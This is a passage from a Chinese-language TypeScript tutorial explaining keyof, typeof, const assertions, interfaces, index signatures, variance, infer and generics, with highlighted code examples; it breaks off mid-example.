<h3 id="in-keyof"><a href="#in-keyof" class="headerlink" title="in keyof"></a>in keyof</h3><p>keyof<code>产生联合类型,</code>in 则可以遍历枚举类型</p>
<p><code>keyof</code> 可以用来取得一个对象接口的所有 <code>key</code>值.</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Foo</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> T = keyof <span class="title class_">Foo</span>; <span class="comment">// -&gt; &quot;name&quot; | &quot;age&quot;</span></span><br></pre></td></tr></table></figure>

<p>in 则可以遍历枚举类型, 例如</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Keys</span> = <span class="string">&quot;a&quot;</span> | <span class="string">&quot;b&quot;</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Obj</span> = &#123;</span><br><span class="line">  [p <span class="keyword">in</span> <span class="title class_">Keys</span>]: <span class="built_in">any</span>;</span><br><span class="line">&#125;; <span class="comment">// -&gt; &#123; a: any, b: any &#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="attr">a</span>: <span class="built_in">number</span> = <span class="number">3</span>;</span><br><span class="line"><span class="comment">// 相当于: const b: number = 4</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">b</span>: <span class="keyword">typeof</span> a = <span class="number">4</span>;</span><br></pre></td></tr></table></figure>

<h3 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h3><h3 id="类型收窄（is）"><a href="#类型收窄（is）" class="headerlink" title="类型收窄（is）"></a>类型收窄（is）</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Values</span> = <span class="built_in">number</span>[] | <span class="built_in">string</span>[];</span><br><span class="line"><span class="keyword">const</span> isNumberArray = (<span class="attr">arr</span>: unknown): arr is <span class="built_in">number</span>[] =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Array</span>.<span class="title function_">isArray</span>(arr) &amp;&amp; arr.<span class="title function_">every</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> <span class="keyword">typeof</span> value === <span class="string">&quot;number&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleValues</span> = (<span class="params">values: Values</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isNumberArray</span>(values)) &#123;</span><br><span class="line">    values.<span class="title function_">map</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> value.<span class="title function_">toFixed</span>(<span class="number">2</span>));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    values.<span class="title function_">map</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> value.<span class="property">length</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="const-断言"><a href="#const-断言" class="headerlink" title="const 断言"></a>const 断言</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="number">10</span>,</span><br><span class="line">  <span class="attr">y</span>: [<span class="number">20</span>, <span class="number">30</span>],</span><br><span class="line">  <span class="attr">z</span>: &#123;</span><br><span class="line">    <span class="attr">a</span>: &#123; <span class="attr">b</span>: <span class="number">42</span> &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125; <span class="keyword">as</span> <span class="keyword">const</span>;</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">obj</span>: &#123;</span><br><span class="line">  <span class="keyword">readonly</span> <span class="attr">x</span>: <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">readonly</span> <span class="attr">y</span>: <span class="keyword">readonly</span> [<span class="number">20</span>, <span class="number">30</span>];</span><br><span class="line">  <span class="keyword">readonly</span> <span class="attr">z</span>: &#123;</span><br><span class="line">    <span class="keyword">readonly</span> <span class="attr">a</span>: &#123;</span><br><span class="line">      <span class="keyword">readonly</span> <span class="attr">b</span>: <span class="number">42</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="没有类型扩展的字面类型"><a href="#没有类型扩展的字面类型" class="headerlink" title="没有类型扩展的字面类型"></a>没有类型扩展的字面类型</h4><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> x = <span class="string">&quot;x&quot;</span>; <span class="comment">// x has the type &#x27;x&#x27;</span></span><br><span class="line"><span class="keyword">let</span> y = <span class="string">&quot;x&quot;</span>; <span class="comment">// y has the type string</span></span><br><span class="line"><span class="keyword">let</span> y = <span class="string">&quot;x&quot;</span> <span class="keyword">as</span> <span class="keyword">const</span>; <span class="comment">// y has type &#x27;x&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="对象字面量获取只读属性"><a href="#对象字面量获取只读属性" class="headerlink" title="对象字面量获取只读属性"></a>对象字面量获取只读属性</h4><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> action = &#123; <span class="attr">type</span>: <span class="string">&quot;INCREMENT&quot;</span> &#125;; <span class="comment">// has type &#123; type: string &#125;</span></span><br><span class="line"><span class="comment">// action的type属性被扩展为string，如果想固定为&#x27;INCREMENT&#x27;，可以通过const断言</span></span><br><span class="line"><span class="keyword">const</span> action = &lt;<span class="keyword">const</span>&gt;&#123; <span class="attr">type</span>: <span class="string">&quot;INCREMENT&quot;</span> &#125;;</span><br></pre></td></tr></table></figure>

<h4 id="数组字面量成为只读元组"><a href="#数组字面量成为只读元组" class="headerlink" title="数组字面量成为只读元组"></a>数组字面量成为只读元组</h4><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">10</span>, <span class="number">30</span>] <span class="keyword">as</span> <span class="keyword">const</span>;</span><br><span class="line"><span class="comment">// arr 不可被push, pop等方法修改</span></span><br></pre></td></tr></table></figure>

<h2 id="接口（Interface）"><a href="#接口（Interface）" class="headerlink" title="接口（Interface）"></a>接口（Interface）</h2><p>接口是对行为的抽象，而具体如何行动需要由类（classes）去实现（implement）</p>
<h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">LabeledValue</span> &#123;</span><br><span class="line">  <span class="attr">label</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">model</span>: <span class="built_in">string</span> = <span class="string">&quot;&quot;</span>; <span class="comment">//默认“”</span></span><br><span class="line">  color?: <span class="built_in">string</span>; <span class="comment">//可选属性</span></span><br><span class="line">  <span class="keyword">readonly</span> <span class="attr">width</span>: <span class="built_in">number</span>; <span class="comment">//只读属性,赋值后不能被改变</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printLabel</span>(<span class="params">labeledObj: LabeledValue</span>) &#123;</span><br><span class="line">  <span class="comment">//引入接口</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(labeledObj.<span class="property">label</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myObj = &#123; <span class="attr">color</span>: <span class="string">&quot;red&quot;</span>, <span class="attr">label</span>: <span class="string">&quot;Size 10 Object&quot;</span>, <span class="attr">width</span>: <span class="number">10</span> &#125;;</span><br><span class="line"><span class="title function_">printLabel</span>(myObj);</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Partial</span>&lt;T&gt; = &#123; [P <span class="keyword">in</span> keyof T]?: T[P] &#125;;</span><br><span class="line"><span class="comment">//keyof T 拿到 T 所有属性名, 然后 in 进行遍历, 将值赋给 P, 最后 T[P] 取得相应属性的值.</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Required</span>&lt;T&gt; = &#123; [P <span class="keyword">in</span> keyof T]-?: T[P] &#125;;</span><br><span class="line"><span class="comment">//将可选项代表的 ? 去掉, 从而让这个类型变成必选项. 与之对应的还有个+? , 这个含义自然与-?之前相反, 它是用来把属性变成可选项的.</span></span><br></pre></td></tr></table></figure>

<h4 id="readonly-vs-const"><a href="#readonly-vs-const" class="headerlink" title="readonly  vs  const"></a>readonly  vs  const</h4><p>做为变量使用的话用<code>const</code>，若做为属性则使用<code>readonly</code>。</p>
<h3 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h3><p>使用接口表示函数类型，我们需要给接口定义一个调用签名。 它就像是一个只有参数列表和返回值类型的函数定义。参数列表里的每个参数都需要名字和类型。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">SearchFunc</span> &#123;</span><br><span class="line">  (<span class="attr">source</span>: <span class="built_in">string</span>, <span class="attr">subString</span>: <span class="built_in">string</span>): <span class="built_in">boolean</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">mySearch</span>: <span class="title class_">SearchFunc</span>;</span><br><span class="line">mySearch = <span class="keyword">function</span> (<span class="params">src, sub</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> result = src.<span class="title function_">search</span>(sub);</span><br><span class="line">  <span class="keyword">return</span> result &gt; -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 函数的参数名不需要与接口里定义的名字相匹配,只要求对应位置上的参数类型是兼容的</span></span><br><span class="line"><span class="comment">//等价</span></span><br><span class="line">mySearch = <span class="keyword">function</span> (<span class="params">source: <span class="built_in">string</span>, subString: <span class="built_in">string</span></span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> result = source.<span class="title function_">search</span>(subString);</span><br><span class="line">  <span class="keyword">return</span> result &gt; -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="可索引的类型"><a href="#可索引的类型" class="headerlink" title="可索引的类型"></a>可索引的类型</h3><p>Typescript 支持两种索引签名：字符串和数字。 可以同时使用两种类型的索引，但是数字索引的返回值必须是字符串索引返回值类型的子类型。 这是因为当使用<code>number</code>来索引时，JavaScript 会将它转换成<code>string</code>然后再去索引对象。 也就是说用<code>100</code>（一个<code>number</code>）去索引等同于使用<code>&quot;100&quot;</code>（一个<code>string</code>）去索引，因此两者需要保持一致。</p>
<h4 id="对数组的约束"><a href="#对数组的约束" class="headerlink" title="对数组的约束"></a>对数组的约束</h4><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">StringArray</span> &#123;</span><br><span class="line">  [<span class="attr">index</span>: <span class="built_in">number</span>]: <span class="built_in">string</span>; <span class="comment">//表示定义的数组是key是number类型，value是string类型</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">myArray</span>: <span class="title class_">StringArray</span>;</span><br><span class="line">myArray = [<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Fred&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> <span class="attr">myStr</span>: <span class="built_in">string</span> = myArray[<span class="number">0</span>]; <span class="comment">//Bob</span></span><br></pre></td></tr></table></figure>

<h4 id="对对象的约束"><a href="#对对象的约束" class="headerlink" title="对对象的约束"></a>对对象的约束</h4><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">UserObj</span> &#123;</span><br><span class="line">  [<span class="attr">index</span>: <span class="built_in">string</span>]: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> <span class="attr">arr</span>: <span class="title class_">UserObj</span> = &#123; <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Dictionary</span>&lt;T&gt; &#123;</span><br><span class="line">  [<span class="attr">index</span>: <span class="built_in">string</span>]: T;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">NumericDictionary</span>&lt;T&gt; &#123;</span><br><span class="line">  [<span class="attr">index</span>: <span class="built_in">number</span>]: T;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="attr">data</span>: <span class="title class_">Dictionary</span>&lt;<span class="built_in">number</span>&gt; = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="attr">b</span>: <span class="number">4</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="类类型"><a href="#类类型" class="headerlink" title="类类型"></a>类类型</h3><p>接口强制一个类去符合某种契约。同时描述了类的公共部分，而不是公共和私有两部分。 它不会帮你检查类是否具有某些私有成员。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">ClockInterface</span> &#123;</span><br><span class="line">  <span class="attr">currentTime</span>: <span class="title class_">Date</span>;</span><br><span class="line">  <span class="title function_">setTime</span>(<span class="attr">d</span>: <span class="title class_">Date</span>): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Clock</span> <span class="keyword">implements</span> <span class="title class_">ClockInterface</span> &#123;</span><br><span class="line">  <span class="attr">currentTime</span>: <span class="title class_">Date</span> = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">  <span class="title function_">setTime</span>(<span class="params">d: <span class="built_in">Date</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">currentTime</span> = d;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">h: <span class="built_in">number</span>, m: <span class="built_in">number</span></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>一个接口可以继承多个接口，创建出多个接口的合成接口。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">  <span class="attr">color</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">PenStroke</span> &#123;</span><br><span class="line">  <span class="attr">penWidth</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Square</span> <span class="keyword">extends</span> <span class="title class_">Shape</span>, <span class="title class_">PenStroke</span> &#123;</span><br><span class="line">  <span class="attr">sideLength</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​</p>
<h4 id="类型兼容性"><a href="#类型兼容性" class="headerlink" title="类型兼容性"></a>类型兼容性</h4><blockquote>
<p>集合论中，如果一个集合的所有元素在集合 B 中都存在，则 A 是 B 的子集；<br>类型系统中，如果一个类型的属性更具体，则该类型是子类型。（因为属性更少则说明该类型约束的更宽泛，是父类型）</p>
</blockquote>
<p>子类型比父类型更加具体,父类型比子类型更宽泛。</p>
<p><strong>可赋值性</strong><br>可以将子类型赋值给父类型，反过来不可以</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="title function_">break</span>(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">a</span>: <span class="title class_">Animal</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">b</span>: <span class="title class_">Dog</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以赋值</span></span><br><span class="line">a = b;</span><br><span class="line"><span class="comment">// 不可赋值</span></span><br><span class="line">b = a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> A = <span class="number">1</span> | <span class="number">2</span> | <span class="number">3</span>;</span><br><span class="line"><span class="keyword">type</span> B = <span class="number">2</span> | <span class="number">3</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">a</span>: A;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">b</span>: B;</span><br><span class="line"><span class="comment">// A更宽泛，是父类型</span></span><br><span class="line"><span class="comment">// 可以赋值</span></span><br><span class="line">a = b;</span><br><span class="line"><span class="comment">// 不可赋值</span></span><br><span class="line">b = a;</span><br></pre></td></tr></table></figure>

<p><strong>协变与逆变</strong><br>简单说就是，具有父子关系的多个类型，在通过某种构造关系构造成的新的类型，如果还具有父子关系则是协变的，而关系逆转了（子变父，父变子）就是逆变的。<br><strong>协变</strong><br>在 Animal 和 Dog 在变成数组后，Array<Dog>依旧可以赋值给 Array<Animal>，因此对于<code>type MakeArray = Array&lt;any&gt;</code>来说就是协变的。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Animal</span><span class="attr">_thing</span>: <span class="title class_">Array</span>&lt;<span class="title class_">Animal</span>&gt;, <span class="title class_">Dog</span><span class="attr">_thing</span>: <span class="title class_">Array</span>&lt;<span class="title class_">Dog</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Animal</span>_thing = <span class="title class_">Dog</span>_thing;</span><br></pre></td></tr></table></figure>

<p><strong>逆变</strong><br>Animal 和 Dog 在进行<code>type Fn&lt;T&gt; = (arg: T) =&gt; void</code>构造器构造后，父子关系逆转了，此时成为“逆变”。理论上，Animal = Dog 是类型安全的，那么 AnimalFn = DogFn 也应该类型安全才对。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">AnimalFn</span> = <span class="function">(<span class="params">arg: Animal</span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">DogFn</span> = <span class="function">(<span class="params">arg: Dog</span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Animal</span><span class="attr">_Function</span>: <span class="title class_">AnimalFn</span>, <span class="title class_">Dog</span><span class="attr">_Function</span>: <span class="title class_">DogFn</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Dog</span>_function = <span class="title class_">Animal</span>_Function;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误</span></span><br><span class="line"><span class="title class_">Animal</span>_Function = <span class="title class_">Dog</span>_Function;</span><br><span class="line"><span class="comment">// 如果可以, Animal_Function合并了AnimalFn和DogFn, animal在调用时约束的参数类型为Animal，缺少dog所需的参数</span></span><br><span class="line"><span class="title class_">Animal</span>_Function(<span class="title class_">Animal</span>_thing);</span><br></pre></td></tr></table></figure>

<p><strong>双向协变</strong><br>Ts 在函数参数的比较中实际上默认采取的策略是双向协变：只有当源函数参数能够赋值给目标函数或者反过来时才能赋值成功<br>​</p>
<p><strong>infer</strong><br>infer 推导的名称相同并且都处于逆变的位置，则推导的结果将会是交叉类型。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Bar</span>&lt;T&gt; = T <span class="keyword">extends</span> &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="function">(<span class="params">x: infer U</span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">  <span class="attr">b</span>: <span class="function">(<span class="params">x: infer U</span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line">  ? U</span><br><span class="line">  : <span class="built_in">never</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// type T1 = string</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">T1</span> = <span class="title class_">Bar</span>&lt;&#123; <span class="attr">a</span>: <span class="function">(<span class="params">x: <span class="built_in">string</span></span>) =&gt;</span> <span class="built_in">void</span>; <span class="attr">b</span>: <span class="function">(<span class="params">x: <span class="built_in">string</span></span>) =&gt;</span> <span class="built_in">void</span> &#125;&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// type T2 = never</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">T2</span> = <span class="title class_">Bar</span>&lt;&#123; <span class="attr">a</span>: <span class="function">(<span class="params">x: <span class="built_in">string</span></span>) =&gt;</span> <span class="built_in">void</span>; <span class="attr">b</span>: <span class="function">(<span class="params">x: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span> &#125;&gt;;</span><br></pre></td></tr></table></figure>

<p>infer 推导的名称相同并且都处于协变的位置，则推导的结果将会是联合类型。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Foo</span>&lt;T&gt; = T <span class="keyword">extends</span> &#123;</span><br><span class="line">  <span class="attr">a</span>: infer U;</span><br><span class="line">  <span class="attr">b</span>: infer U;</span><br><span class="line">&#125;</span><br><span class="line">  ? U</span><br><span class="line">  : <span class="built_in">never</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// type T1 = string</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">T1</span> = <span class="title class_">Foo</span>&lt;&#123; <span class="attr">a</span>: <span class="built_in">string</span>; <span class="attr">b</span>: <span class="built_in">string</span> &#125;&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// type T2 = string | number</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">T2</span> = <span class="title class_">Foo</span>&lt;&#123; <span class="attr">a</span>: <span class="built_in">string</span>; <span class="attr">b</span>: <span class="built_in">number</span> &#125;&gt;;</span><br></pre></td></tr></table></figure>

<h2 id="泛型（Generics）"><a href="#泛型（Generics）" class="headerlink" title="泛型（Generics）"></a>泛型（Generics）</h2><h3 id="泛型变量"><a href="#泛型变量" class="headerlink" title="泛型变量"></a>泛型变量</h3><p><strong>泛型就是：给类型传参。</strong>3 个主要用途：</p>
<ol>
<li> 声明泛型容器或组件。比如：各种容器类 Map、Array、Set 等；各种组件，比如 React.Component。</li>
<li> 在使用时按需对类型进行约束。比如：使用 extends 约束传入参数符合某种特定结构。</li>
<li> 生成新的类型。比如，上一章提到的 ReturnType。</li>
</ol>
<p>当使用 TypeScript 实现的时候，我们需要在执行前就定义好函数返回的类型，但是我们又不能确定这个对象到底是什么类型，这里就可以借助泛型来实现：这是一种使返回值的类型与传入参数的类型是相同的方法。 这里，我们使用了类型变量，它是一种特殊的变量，只用于表示类型而不是值。<br>我们给 identity 添加了类型变量<code>T</code>。 <code>T</code>帮助我们捕获用户传入的类型（比如：<code>number</code>），之后我们就可以使用这个类型。 之后我们再次使用了<code>T</code>当做返回值类型。现在我们可以知道参数类型与返回值类型是相同的了。 这允许我们跟踪函数里使用的类型的信息。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> identity&lt;T&gt;(<span class="attr">arg</span>: T): T &#123;</span><br><span class="line">  <span class="comment">//1.声明泛型，2.参数泛型，3.返回值泛型</span></span><br><span class="line">  <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//事先不知道它是哪种类型，所以不能随意的操作它的属性或方法，表明泛型是个数组后可以使用.length</span></span><br><span class="line"><span class="keyword">function</span> loggingIdentity&lt;T&gt;(<span class="attr">arg</span>: T[]): T[] &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(arg.<span class="property">length</span>); <span class="comment">// Array has a .length, so no more error</span></span><br><span class="line">  <span class="keyword">return</span> 